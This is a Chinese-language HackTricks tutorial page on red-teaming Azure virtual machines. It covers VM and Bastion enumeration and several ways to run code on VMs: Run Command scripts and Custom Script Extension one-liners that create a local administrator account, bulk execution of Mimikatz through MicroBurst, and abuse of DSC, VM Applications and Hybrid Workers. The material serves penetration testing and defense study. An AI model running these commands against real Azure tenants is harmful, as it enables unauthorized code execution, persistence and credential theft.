# Az - 虚拟机 & 网络

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 基本信息

Azure虚拟机是Azure提供的几种类型的[按需，可扩展计算资源](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree)之一。通常，当您需要比其他选择提供的更多控制计算环境时，您会选择虚拟机。本文为您提供了在创建虚拟机之前应考虑的信息，如何创建它，以及如何管理它。

## Azure网络信息

Azure网络包含**不同的实体和配置方式。** 您可以在以下内容中找到不同Azure网络实体的**简要描述，** **示例** 和 **枚举**命令：

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion** 是一个完全托管的服务，它提供**安全且无缝的RDP**（远程桌面协议）和**SSH**（安全外壳）**访问**，直接在Azure门户中通过SSL访问您的**虚拟机**。这项服务是将您的虚拟机暴露给公共互联网连接的更安全、更便捷的**替代方案**。Azure Bastion在您的Azure虚拟网络内配置，为VNet中的所有VM提供RDP和SSH连接，使用私有IP地址，这意味着您不需要为Azure VM分配公共IP地址。

因此，如果您的公司在Azure VNet内托管了几个用于开发和测试的VM。**而不是设置公共IP地址和管理每个VM的NSG规则**以启用RDP或SSH访问，您**部署Azure Bastion**。有了Azure Bastion，您的开发人员和IT人员可以**安全地使用他们的网络浏览器从Azure门户访问这些VM**，无需公共IP地址。

要列出您订阅中的所有Azure Bastion主机，您可以使用以下命令：

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
## VM 枚举
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **在虚拟机中运行命令**

### **VM中的AAD登录**

可以允许通过AzureAD认证的用户访问。例如，尝试访问一个**linux VM**：`ssh username@azure-corp.com@1.1.1.1`（使用登录时用的azurecorp的**电子邮件**很重要），你可能会遇到如下错误：

{% code overflow="wrap" %}
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

只需**按照这些指示**访问 [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) 并输入代码，使用电子邮件和密码作为凭证，您将能够通过 SSH 连接（如果该用户有足够的权限：`Virtual Machine Administrator Login` 或 `Virtual Machine User Login` 角色）。

### **运行命令**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' –Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **运行自定义脚本扩展**

Azure 虚拟机（VM）扩展是**小型应用程序**，它们在**Azure VMs**上提供部署后的配置和自动化**任务**。例如，如果虚拟机需要安装软件、防病毒保护，或者需要在其内部运行脚本，您可以使用 VM 扩展。

因此，如果您有写入权限，您可以执行任意代码：
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState

**DesiredConfigurationState (DSC)** 类似于 Ansible，但它是 PowerShell 内的一个工具，允许通过代码设置主机。DSC 在 Azure 中有自己的扩展，允许上传**配置文件**。DSC [配置文件](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) 在语法上非常挑剔，然而 DSC 扩展非常轻信，只要遵循一定的格式，它会**盲目执行任何命令**，如图 5 所示。

<figure><img src="../../../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

这可以通过 **Az PowerShell** 函数 [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) 来完成。DSC 扩展需要一个带有**函数**的 **.PS1** 文件，并打包在 **.zip** 文件中。由于这实际上不是正确的 DSC 语法，扩展状态将显示为“失败”，但代码将被执行。这样做的问题是没有命令的输出，因为状态被失败消息覆盖了。

### VM Application Definitions

[VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) 资源是一种向 Azure VM **重复部署版本化应用程序**的方式。例如，如果您创建一个**程序**并将其作为版本 1.0 **部署**到所有 Azure VM，一旦将程序**更新到 1.1**，您可以使用相同的 VM Application **创建另一个定义**并将更新推送到任何 VM。\
能够**推送应用程序**到 VM 意味着它是另一种**代码执行**的途径。这种方法的缺点是设置应用程序定义[**需要一些步骤**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal)，但可以使用 Az PowerShell 中的 **`New-AzGalleryApplication`** 和 **`New-AzGalleryApplicationVersion`** cmdlets 来完成。

这项技术通过使用一个**扩展“VMAppExtension”**工作，当将应用程序应用到 VM 时，该扩展会自动安装。扩展将文件从 URI 下载到磁盘上，名称与应用程序名称_完全相同_，这意味着如果应用程序名称是‘AzApplication’，磁盘上的文件也叫做‘AzApplication’，没有扩展名。这要求在 [REST API 调用](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) 中配置“ManageActions”字段，以便用适当的扩展名重命名应用程序。如果您不想运行整个应用程序，可以通过滥用同一 REST API 方法中的 ManageActions 字段或通过 Azure Portal 来运行任意 PowerShell 命令。一旦设置好，定义将类似于图 8。

<figure><img src="../../../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

不幸的是，这种执行技术速度较慢（执行应用程序或命令大约需要 3-4 分钟），但由于它相对较新，我会感到惊讶如果有任何特定的检测被编写。

由于最终是扩展执行了操作，应用程序的副本位于 `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`，执行的状态保留在 `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`。

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) 允许在自动化帐户中配置的**Runbook**在作为**配置 HWG**的一部分的**Azure 虚拟机**上**运行**。同样，**扩展被用于**在 VM 上部署 Runbook 代码。由于使用了扩展，凭据无关紧要，代码作为**SYSTEM**或 root 执行。

<figure><img src="../../../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

如果使用 Windows 10 VM，重要的是让 Runbook 作为 PowerShell 版本 5.1 而不是 7.1 运行，因为 7.1 默认不安装在 VM 上，脚本将无法运行。

## 参考资料

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>从零开始学习 AWS 黑客攻击直到成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持 HackTricks 的其他方式：

* 如果您想在 **HackTricks** 中看到您的**公司广告**或**下载 HackTricks 的 PDF** 版本，请查看 [**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取 [**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* 发现 [**PEASS 家族**](https://opensea.io/collection/the-peass-family)，我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 收藏
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享您的黑客技巧。

</details>
